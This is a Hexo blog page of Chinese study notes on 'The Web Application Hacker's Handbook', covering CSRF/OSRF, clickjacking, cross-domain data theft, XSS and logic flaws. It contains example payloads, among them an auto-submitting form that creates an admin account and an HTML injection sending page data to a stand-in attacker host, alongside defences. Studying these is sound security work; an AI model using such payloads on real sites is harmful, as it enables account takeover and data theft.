<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-Web 应用黑客手册/第十三章：攻击用户：其他技巧" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/07/11/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E7%94%A8%E6%88%B7%EF%BC%9A%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7/" class="article-date">
  <time datetime="2020-07-11T03:48:55.625Z" itemprop="datePublished">2020-07-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/11/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E7%94%A8%E6%88%B7%EF%BC%9A%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7/">Web 应用黑客手册/第十三章：攻击用户：其他技巧</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="攻击用户：其他技巧"><a href="#攻击用户：其他技巧" class="headerlink" title="攻击用户：其他技巧"></a>攻击用户：其他技巧</h3><h4 id="诱导用户操作"><a href="#诱导用户操作" class="headerlink" title="诱导用户操作"></a>诱导用户操作</h4><h5 id="请求伪造"><a href="#请求伪造" class="headerlink" title="请求伪造"></a>请求伪造</h5><h5 id="OSRF"><a href="#OSRF" class="headerlink" title="OSRF"></a>OSRF</h5><p>OSRF: On-site request forgery</p>
<p>考虑如下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/images/question.gif"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">td</span>&gt;</span>daf<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">td</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>假如图片的 src 是用户可以操控的，首先考虑 XSS 漏洞，即使不存在 XSS 漏洞，也可以考虑 OSRF 漏洞。</p>
<p>比如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"../admin/newUser.php?username=daf2&amp;password=0wned&amp;role=admin#.gif"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">td</span>&gt;</span>daf<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">td</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当管理员查看该图片所在网页时，就会添加新用户。</p>
<p>Hack Steps</p>
<ol>
<li>对于不能所有不能进行存储型 XSS 攻击的位置，尝试 OSRF 攻击</li>
<li>除非引用过滤了任何必要的字符，一般都有漏洞</li>
<li>如果发现了 OSRF 漏洞，之后就是寻找合适攻击 URL</li>
</ol>
<h5 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h5><p>CSRF: cross-site request forgery</p>
<p>考虑如下请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;auth&#x2F;390&#x2F;NewUserStep2.ashx HTTP&#x2F;1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Cookie: SessionId&#x3D;8299BE6B260193DA076383A2385B07B9</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">realname&#x3D;daf&amp;username&#x3D;daf&amp;userrole&#x3D;admin&amp;password&#x3D;letmein1&amp;</span><br><span class="line">confirmpassword&#x3D;letmein1</span><br></pre></td></tr></table></figure>

<p>该请求用于添加管理员用户。</p>
<p>该请求含有 3 个关键信息：</p>
<ol>
<li>该请求执行特权操作</li>
<li>该请求只依赖 HTTP cookie 用于区分会话</li>
<li>攻击者可以确定用于执行操作的所有参数</li>
</ol>
<p>攻击者可以在自己的网页加入如下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://mdsec.net/auth/390/NewUserStep2.ashx"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"realname"</span> <span class="attr">value</span>=<span class="string">"daf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"daf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"userrole"</span> <span class="attr">value</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"letmein1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"confirmpassword"</span> <span class="attr">value</span>=<span class="string">"letmein1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>一旦管理员用户打开该网页，就会创建新管理员用户。</p>
<p>Hack Steps</p>
<ol>
<li>查看应用的关键功能</li>
<li>找那些只依赖 cookie 的敏感函数</li>
<li>创建一个不需要任何交互就可以发出请求的 HTML 页面</li>
<li>登录应用，使用相同的浏览器打开伪造的 HTML 页面，验证攻击</li>
</ol>
<p>假如该 URL 有 SQL 注入漏洞，那就更加厉害了。</p>
<h6 id="身份验证和-CSRF"><a href="#身份验证和-CSRF" class="headerlink" title="身份验证和 CSRF"></a>身份验证和 CSRF</h6><p>路由器攻击</p>
<p>一般路由器都用 web 应用进行配置，使用 CSRF 攻击路由器时可分为 2 步：</p>
<ol>
<li>使用默认用户名和密码登录</li>
<li>执行敏感操作</li>
</ol>
<p>在某些场景下，攻击者需要用户执行某些操作，比如，某应用允许用户上传和下载文件，同时该应用的下载功能有 XSS 漏洞，这个漏洞是个低危漏洞，因为这个漏洞只能用于攻击自己。但是，假如上传功能存在 CSRF 漏洞，攻击者可以先诱导用户上传恶意文件，然后再下载，就会出发 XSS 漏洞。</p>
<h6 id="修复-CSRF-缺陷"><a href="#修复-CSRF-缺陷" class="headerlink" title="修复 CSRF 缺陷"></a>修复 CSRF 缺陷</h6><p>CSRF 漏洞根源在于浏览器会自动发送网站的 cookie。假如应用某个功能只通过 cookie 来区分，这种问题几乎是不可避免的。</p>
<p>标准的防御 CSRF 漏洞的方法是：除了 cookie 之外，再加一种标记来区分会话。假如攻击者无法确定该标记，就无法伪造 HTTP 请求。其实相当于使用了两种 token，一种是 cookie，一种是其他。</p>
<p>anti-CSRF token 的长度比较短，可以么？不可以。因为一般情况下：</p>
<ol>
<li>anti-CSRF token 是 URL 的某个参数</li>
<li>anti-CSRF token 不是一次性的</li>
</ol>
<p>可以通过基于 CSS 的手段来暴力枚举 anti-CSRF token</p>
<h6 id="借助-XSS-进行-CSRF"><a href="#借助-XSS-进行-CSRF" class="headerlink" title="借助 XSS 进行 CSRF"></a>借助 XSS 进行 CSRF</h6><p>有的场景下，XSS 有助于 CSRF</p>
<ul>
<li>如果有存储型 XSS 漏洞，可以直接读取 anti-CSRF token </li>
<li>如果应用只对部分功能部署了 anti-CSRF token，在没有部署的功能上存在反射型 XSS 漏洞</li>
<li>假如 anti-CSRF token 和用户绑定，而不是会话。攻击者知道自己的 anti-CSRF token，因此可以 CSRF 诱导用户登录攻击者账户，然后使用 CSRF 诱导用户触发存储型同源 XSS 漏洞，注入的脚本有如下功能：先退出当前账户，然后诱导用户登录，就可以获取用户的用户名和密码。</li>
</ul>
<p>合适的 anti-CSRF 手段确实使得反射型 XSS 利用变难了。</p>
<h5 id="UI-渲染"><a href="#UI-渲染" class="headerlink" title="UI 渲染"></a>UI 渲染</h5><p>也称作点击劫持。</p>
<h6 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h6><p>framebusting：通过检测应用是否在 iframe 的技术</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    if (top.location != self.location)</span><br><span class="line">        &#123; top.location = self.location &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 X-Frame-Options 可以解决该问题</p>
<h4 id="获取跨域数据"><a href="#获取跨域数据" class="headerlink" title="获取跨域数据"></a>获取跨域数据</h4><h5 id="注入-HTML-获取数据"><a href="#注入-HTML-获取数据" class="headerlink" title="注入 HTML 获取数据"></a>注入 HTML 获取数据</h5><p>看如下例子</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[ limited HTML injection here ]</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'http://mdattacker.net/capture?html=</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;form action="http://mdattacker.net/capture" method="POST"&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;form action="http://wahh-mail.com/forwardemail" method="POST"&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;input type="hidden" name="nonce" value="2230313740821"&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;input type="submit" value="Forward"&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">...</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;/form&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">var _StatsTrackerId='</span><span class="attr">AAE78F27CB3210D</span>';</span></span><br><span class="line"><span class="tag"><span class="attr">...</span></span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>通过注入未闭合的  img 元素，可以把数据发送给攻击者</p>
<p>也可以注入 form 元素，从而覆盖掉本来的 form</p>
<h5 id="注入-CSS-获取数据"><a href="#注入-CSS-获取数据" class="headerlink" title="注入 CSS 获取数据"></a>注入 CSS 获取数据</h5><p>没看懂</p>
<h5 id="JavaScript-劫持"><a href="#JavaScript-劫持" class="headerlink" title="JavaScript 劫持"></a>JavaScript 劫持</h5><p>异步回调的响应中，包含调用页面已有函数的脚本，显示用户信息，可以注入同名被调用函数，把消息发送给攻击者</p>
<h6 id="JSON-劫持"><a href="#JSON-劫持" class="headerlink" title="JSON 劫持"></a>JSON 劫持</h6><p>劫持 array 的定义，在执行反序列化函数时，把消息发送给攻击者</p>
<h6 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">var nonce = ‘222230313740821’;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"># 注入</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://wahh-network.com/status"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    alert(nonce);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function setStatus(status)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    nonce &#x3D; ‘222230313740821’;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;wahh-network.com&#x2F;status&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    setStatus(‘a’);</span><br><span class="line">    alert(nonce);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="再谈同源策略"><a href="#再谈同源策略" class="headerlink" title="再谈同源策略"></a>再谈同源策略</h4><h5 id="同源策略和浏览器插件"><a href="#同源策略和浏览器插件" class="headerlink" title="同源策略和浏览器插件"></a>同源策略和浏览器插件</h5>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/07/11/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E7%94%A8%E6%88%B7%EF%BC%9A%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7/" data-id="ckchs4fn30000usfe22dmgay4" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Web 应用黑客手册/第十二章：攻击用户：跨站脚本" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/07/09/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E7%94%A8%E6%88%B7%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" class="article-date">
  <time datetime="2020-07-09T11:51:07.184Z" itemprop="datePublished">2020-07-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/09/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E7%94%A8%E6%88%B7%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/">Web 应用黑客手册/第十二章：攻击用户：跨站脚本</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="攻击用户：跨站脚本"><a href="#攻击用户：跨站脚本" class="headerlink" title="攻击用户：跨站脚本"></a>攻击用户：跨站脚本</h3><h4 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h4><p>XSS 分为：反射型，存储型和 DOM 型。</p>
<h5 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h5><p>直接把用户的输入插入 HTML 文档</p>
<ol>
<li>用户登录</li>
<li>攻击者发送伪造的 URL 给用户</li>
<li>用户点击伪造的 URL</li>
<li>服务端返回带有攻击者 JavaScript 代码的响应报文</li>
<li>攻击者的脚本在用户浏览器执行</li>
<li>攻击者的脚本发送会话令牌给攻击者</li>
<li>攻击者得到会话令牌</li>
</ol>
<h5 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h5><ol>
<li>攻击者发送恶意信息到服务端</li>
<li>用户登录</li>
<li>用户查看攻击者的信息</li>
<li>服务端返回带有攻击者 JavaScript 代码的响应报文</li>
<li>攻击者的脚本在用户浏览器执行</li>
<li>攻击者的脚本发送会话令牌给攻击者</li>
<li>攻击者得到会话令牌</li>
</ol>
<p>攻击者需要诱导用户才能利用反射型 XSS 漏洞，但是，对于存储型 XSS，不需要这么麻烦。</p>
<h5 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h5><ol>
<li>用户登录</li>
<li>攻击者发送伪造的 URL 给用户</li>
<li>用户点击伪造的 URL</li>
<li>服务端返回包含 JavaScript 硬编码的脚本</li>
<li>浏览器处理返回的 HTML 文档，出发攻击者的脚本</li>
<li>攻击者的脚本发送会话令牌给攻击者</li>
<li>攻击者得到会话令牌</li>
</ol>
<h4 id="XSS-正在进行"><a href="#XSS-正在进行" class="headerlink" title="XSS 正在进行"></a>XSS 正在进行</h4><h5 id="现实中的-XSS-攻击"><a href="#现实中的-XSS-攻击" class="headerlink" title="现实中的 XSS 攻击"></a>现实中的 XSS 攻击</h5><p>2010 年，阿帕奇基金会的问题跟踪应用被发现有反射型 XSS 漏洞。攻击者上传恶意链接，管理员点击该链接，恶意脚本执行，修改了应用的 upload 目录的权限为可执行。攻击者随后上传了木马，用该木马窃取用户的用户名和密码。</p>
<p>2005 年，社交网站 MySpace 被发现存储型 XSS 漏洞。攻击者绕过了网站部署的过滤手段，在个人介绍页面上传了恶意代码。当用户访问攻击者的个人介绍页面时，该恶意代码便执行。该代码做两件事：把攻击者添加为好友，修改自己的个人介绍为恶意脚本。</p>
<p>2009 年，Web 邮件应用提供商 StrongWebmail 宣布奖励 10000$ 给攻破该公司 CEO 邮箱的黑客。之后，有人发现该应用的一处存储型 XSS 漏洞，赢得奖金。</p>
<p>2009 年，Twitter 遭受了两次存储型 XSS 漏洞引起的蠕虫攻击。</p>
<h5 id="XSS-攻击的-payloads"><a href="#XSS-攻击的-payloads" class="headerlink" title="XSS 攻击的 payloads"></a>XSS 攻击的 payloads</h5><h6 id="虚拟损失"><a href="#虚拟损失" class="headerlink" title="虚拟损失"></a>虚拟损失</h6><p>攻击者可以向网站注入误导信息：污蔑羞辱公司，引流到竞争网站，等。</p>
<h6 id="注入木马"><a href="#注入木马" class="headerlink" title="注入木马"></a>注入木马</h6><p>注入一个登录页面</p>
<h6 id="诱导用户"><a href="#诱导用户" class="headerlink" title="诱导用户"></a>诱导用户</h6><p>可以修改攻击者的权限，虽然大部分普通用户都会失败，但是管理员用户可以。</p>
<h6 id="利用信任关系"><a href="#利用信任关系" class="headerlink" title="利用信任关系"></a>利用信任关系</h6><p>之前的攻击都利用了这一信任关系：来自同一个域的代码可以获取该域的 cookie，除此之外，还有其他信任关系：</p>
<ol>
<li>该域的代码可以获取该域之前的自动填充的数据，比如，银行卡之类的信息</li>
<li>某些应用会推荐用户把自己设置为受信任的网站，之后就可以在本地执行程序</li>
</ol>
<h6 id="客户端攻击升级"><a href="#客户端攻击升级" class="headerlink" title="客户端攻击升级"></a>客户端攻击升级</h6><p>收集键盘信息，利用算力挣数字货币，等。</p>
<h5 id="XSS-攻击的投放机制"><a href="#XSS-攻击的投放机制" class="headerlink" title="XSS 攻击的投放机制"></a>XSS 攻击的投放机制</h5><h6 id="反射型和-DOM-型-XSS-漏洞投放"><a href="#反射型和-DOM-型-XSS-漏洞投放" class="headerlink" title="反射型和 DOM 型  XSS 漏洞投放"></a>反射型和 DOM 型  XSS 漏洞投放</h6><ol>
<li>电子邮件</li>
<li>即时消息</li>
<li>支持插入 URL 的任何网站</li>
<li>攻击者自己的网站</li>
<li>广告链接</li>
</ol>
<h6 id="存储型-XSS-漏洞投放"><a href="#存储型-XSS-漏洞投放" class="headerlink" title="存储型 XSS 漏洞投放"></a>存储型 XSS 漏洞投放</h6><ol>
<li>个人信息页面</li>
<li>文件名</li>
<li>管理员问题反馈</li>
<li>消息，问题，状态等</li>
<li>任何可能出现在日志的参数</li>
<li>用户共享内容</li>
</ol>
<h6 id="结合-XSS-攻击和其他攻击"><a href="#结合-XSS-攻击和其他攻击" class="headerlink" title="结合 XSS 攻击和其他攻击"></a>结合 XSS 攻击和其他攻击</h6><ul>
<li>一个信息，只有用户自己可见，有存储型 XSS 漏洞</li>
<li>由于访问控制缺陷，其他用户可以编辑该信息</li>
</ul>
<p>二者结合，就是个严重的漏洞了。</p>
<h4 id="寻找和利用-XSS-漏洞"><a href="#寻找和利用-XSS-漏洞" class="headerlink" title="寻找和利用 XSS 漏洞"></a>寻找和利用 XSS 漏洞</h4><h5 id="寻找和利用反射型-XSS-漏洞"><a href="#寻找和利用反射型-XSS-漏洞" class="headerlink" title="寻找和利用反射型 XSS 漏洞"></a>寻找和利用反射型 XSS 漏洞</h5><ol>
<li>给每个入口提交温和的字符串</li>
<li>鉴别响应</li>
<li>找到相应对应的上下文</li>
<li>根据上下文，输入定制脚本</li>
<li>如果脚本被 block，尝试绕过</li>
</ol>
<h6 id="鉴别输入响应"><a href="#鉴别输入响应" class="headerlink" title="鉴别输入响应"></a>鉴别输入响应</h6>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/07/09/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E7%94%A8%E6%88%B7%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" data-id="ckcexwdlc0000isfebnzxa4gf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Web 应用黑客手册/第十一章：攻击应用逻辑" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/07/01/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E5%BA%94%E7%94%A8%E9%80%BB%E8%BE%91/" class="article-date">
  <time datetime="2020-07-01T14:14:26.480Z" itemprop="datePublished">2020-07-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/01/Web%20%E5%BA%94%E7%94%A8%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0%EF%BC%9A%E6%94%BB%E5%87%BB%E5%BA%94%E7%94%A8%E9%80%BB%E8%BE%91/">Web 应用黑客手册/第十一章：攻击应用逻辑</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="攻击应用逻辑"><a href="#攻击应用逻辑" class="headerlink" title="攻击应用逻辑"></a>攻击应用逻辑</h3><h4 id="逻辑缺陷的本质"><a href="#逻辑缺陷的本质" class="headerlink" title="逻辑缺陷的本质"></a>逻辑缺陷的本质</h4><p>逻辑缺陷的本质是：开发人员做了错误的的假设。或者说，他们算漏了，有 corner case 没有考虑到。</p>
<h4 id="现实中的逻辑缺陷"><a href="#现实中的逻辑缺陷" class="headerlink" title="现实中的逻辑缺陷"></a>现实中的逻辑缺陷</h4><h5 id="求助神谕"><a href="#求助神谕" class="headerlink" title="求助神谕"></a>求助神谕</h5><h6 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h6><p>为了实现 remember me 功能，设置了 cookie。同时，还实现了一个功能：当用户打开网页的时候，显示“亲爱的 XXX，好久不见”类似的标语。开发人员把 XXX 对应的信息存在 cookie 的 ScreenName 中。</p>
<h6 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h6><p>开发人员认为也可以用 remember me 对应的加密算法保护 ScreenName</p>
<h6 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h6><p>用户可以指定 ScreenName。</p>
<p>把 remember me 的 cookie 作为 ScreenName 的 value 发送给应用，显示如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome, marcus|734|192.168.4.282750184</span><br></pre></td></tr></table></figure>

<p>重新设置 ScreenName 如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin|734|192.168.4.282750184</span><br></pre></td></tr></table></figure>

<p>获取到 cookie 中 ScreenName 的加密值，把该加密值当作 remember me 的 value 传给应用，就登录管理员账号了。</p>
<p>这种形式的漏洞出现在很多场景，比如账户恢复，基于令牌访问受限资源，以及任何发送到客户端但是不希望用户可以解读的信息。</p>
<p>hack steps：</p>
<ol>
<li>寻找应用程序中使用加密（不是哈希，哈希是单向的，加密是双向的，这一步是为了寻找可以利用的加解密接口）的位置。</li>
<li>寻找神谕泄密漏洞，找到可以提供密文显示明文的接口。</li>
</ol>
<h5 id="欺骗密码修改功能"><a href="#欺骗密码修改功能" class="headerlink" title="欺骗密码修改功能"></a>欺骗密码修改功能</h5><h6 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h6><p>普通用户修改密码需要提供：用户名，原密码，新密码。</p>
<p>管理员修改密码需要提供：用户名，新密码。</p>
<p>这两个功能在同一个服务端脚本中。</p>
<h6 id="假设-1"><a href="#假设-1" class="headerlink" title="假设"></a>假设</h6><p>开发人员假设：不提供原密码的都是管理员。</p>
